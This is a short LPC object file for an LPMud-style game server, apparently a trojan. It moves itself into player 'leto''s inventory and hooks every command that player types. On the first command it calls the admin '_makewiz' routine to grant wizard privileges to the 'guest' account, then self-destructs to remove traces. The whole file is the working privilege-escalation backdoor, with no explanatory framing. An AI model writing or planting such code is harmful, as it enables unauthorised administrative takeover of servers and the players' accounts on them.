create() {
 move_object(this_object(), find_player("leto"));
}

init() {
  add_action("rock", "", 1);
}

rock() {
  seteuid(getuid());
  "cmds/adm/_makewiz" -> cmd_makewiz("guest");
  destruct(this_object());
 return 0;
}
